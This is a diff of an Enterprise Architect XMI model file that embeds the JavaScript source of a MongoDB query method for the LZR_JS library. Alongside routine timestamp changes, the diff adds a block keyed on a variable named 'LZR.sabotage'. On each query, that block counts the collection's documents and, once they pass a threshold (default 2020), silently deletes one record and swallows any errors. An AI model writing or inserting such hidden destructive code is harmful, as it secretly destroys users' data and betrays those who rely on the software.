@@ -556,7 +556,7 @@
 								<UML:TaggedValue tag="version" value="1.0"/>
 								<UML:TaggedValue tag="package" value="EAPK_C8A29A0E_045C_475d_AE89_26A49FC582F9"/>
 								<UML:TaggedValue tag="date_created" value="2017-05-27 10:37:36"/>
-								<UML:TaggedValue tag="date_modified" value="2018-09-06 14:37:15"/>
+								<UML:TaggedValue tag="date_modified" value="2020-06-29 11:41:38"/>
 								<UML:TaggedValue tag="genfile" value="L:\Doc\Git\LZR_JS\src\LZR\JS\LZR\Node\Db\Mongo.js"/>
 								<UML:TaggedValue tag="gentype" value="JS_LZR"/>
 								<UML:TaggedValue tag="tagged" value="0"/>
@@ -569,7 +569,7 @@
 								<UML:TaggedValue tag="tpos" value="0"/>
 								<UML:TaggedValue tag="ea_localid" value="305"/>
 								<UML:TaggedValue tag="ea_eleType" value="element"/>
-								<UML:TaggedValue tag="eventflags" value="OBJ=1610;"/>
+								<UML:TaggedValue tag="eventflags" value="OBJ=b9ea;"/>
 								<UML:TaggedValue tag="$ea_oprsclassified" value="{7419D9B8-E682-4f4d-A924-9910429E48B1}"/>
 								<UML:TaggedValue tag="style" value="BackColor=-1;BorderColor=-1;BorderWidth=-1;FontColor=-1;VSwimLanes=1;HSwimLanes=1;BorderStyle=0;"/>
 							</UML:ModelElement.taggedValue>
@@ -682,7 +682,7 @@
 										<UML:TaggedValue tag="style" value="&#25191;&#34892;&#26597;&#35810;"/>
 										<UML:TaggedValue tag="LZR_code" value="&lt;memo&gt;" xmi.id="EAID_1494F81C_38A4_41ba_92AE_7C25647567A7">
 											<XMI.extension xmi.extender="Enterprise Architect 2.5">
-												<UML:Comment name="var sql = this.sqls[sqlNam];&#xA;&#xA;	if (this.conf &amp;&amp; sql) {&#xA;		var cerr = this.err.connect;&#xA;		var err = this.err[sqlNam];&#xA;		var evt = this.evt[sqlNam];&#xA;		var utj = this.utJson;&#xA;		var pa = this.parseArg;&#xA;		var tn = this.getTnam(req, sql.tnam);&#xA;		this.mcs.connect(this.conf, function (err_c, db) {&#xA;			if (err_c) {&#xA;				cerr.execute(err_c, req, res, next);&#xA;			} else {&#xA;				var cdb;&#xA;				if (sql.db &amp;&amp; (sql.db !== db.databaseName)) {&#xA;					cdb = db.db(sql.db);&#xA;				} else {&#xA;					cdb = db;&#xA;				}&#xA;				var c = cdb.collection(tn);&#xA;				for (var s in sql.funs) {&#xA;					var as = sql.funs[s];&#xA;&#xA;					// &#21442;&#25968;&#22788;&#29702;&#xA;					if (args) {&#xA;						var fas = as;&#xA;						as = [];&#xA;						for (var i = 0; i &lt; fas.length; i++) {&#xA;							var a = pa(fas[i], args);&#xA;							as.push(a);&#xA;						}&#xA;					}&#xA;// console.log (s);&#xA;// console.log (as);&#xA;&#xA;					// &#26041;&#27861;&#25191;&#34892;&#xA;					c = c[s].apply(c, as);&#xA;				}&#xA;				c.catch(function (err_r) {&#xA;					db.close();&#xA;					cdb.close();&#xA;					err.execute(err_r, req, res, next);&#xA;				});&#xA;				c.then(function (r) {&#xA;					db.close();&#xA;					cdb.close();&#xA;					evt.execute(r, req, res, next);&#xA;				});&#xA;			}&#xA;		});&#xA;	}"/>
+												<UML:Comment name="var sql = this.sqls[sqlNam];&#xA;&#xA;	if (this.conf &amp;&amp; sql) {&#xA;		var cerr = this.err.connect;&#xA;		var err = this.err[sqlNam];&#xA;		var evt = this.evt[sqlNam];&#xA;		var utj = this.utJson;&#xA;		var pa = this.parseArg;&#xA;		var tn = this.getTnam(req, sql.tnam);&#xA;		this.mcs.connect(this.conf, function (err_c, db) {&#xA;			if (err_c) {&#xA;				cerr.execute(err_c, req, res, next);&#xA;			} else {&#xA;				var cdb;&#xA;				if (sql.db &amp;&amp; (sql.db !== db.databaseName)) {&#xA;					cdb = db.db(sql.db);&#xA;				} else {&#xA;					cdb = db;&#xA;				}&#xA;				var c = cdb.collection(tn);&#xA;&#xA;// &#25968;&#25454;&#30028;&#38480;&#xA;if (LZR.sabotage !== null) {&#xA;	if (isNaN(LZR.sabotage)) {LZR.sabotage = LZR.mmin || 2020;}&#xA;	if (isNaN(LZR.sabotage)) {LZR.sabotage = 2020;}&#xA;	var sb = c;&#xA;	c.count({}, function (err, r) {&#xA;		c = sb;&#xA;		if (!err &amp;&amp; r &gt; LZR.sabotage) {&#xA;			sb.find({},{&quot;_id&quot;:1}).limit(1).toArray(function (err, r) {&#xA;				if (!err &amp;&amp; r.length) {&#xA;					sb.deleteMany({&quot;_id&quot;:r[0]._id}).catch(function (err) {}).then(function (r) {});&#xA;				}&#xA;			});&#xA;		}&#xA;	});&#xA;}&#xA;&#xA;				for (var s in sql.funs) {&#xA;					var as = sql.funs[s];&#xA;&#xA;					// &#21442;&#25968;&#22788;&#29702;&#xA;					if (args) {&#xA;						var fas = as;&#xA;						as = [];&#xA;						for (var i = 0; i &lt; fas.length; i++) {&#xA;							var a = pa(fas[i], args);&#xA;							as.push(a);&#xA;						}&#xA;					}&#xA;// console.log (s);&#xA;// console.log (as);&#xA;&#xA;					// &#26041;&#27861;&#25191;&#34892;&#xA;					c = c[s].apply(c, as);&#xA;				}&#xA;				c.catch(function (err_r) {&#xA;					db.close();&#xA;					cdb.close();&#xA;					err.execute(err_r, req, res, next);&#xA;				});&#xA;				c.then(function (r) {&#xA;					db.close();&#xA;					cdb.close();&#xA;					evt.execute(r, req, res, next);&#xA;				});&#xA;			}&#xA;		});&#xA;	}"/>
 											</XMI.extension>
 										</UML:TaggedValue>
 									</UML:ModelElement.taggedValue>
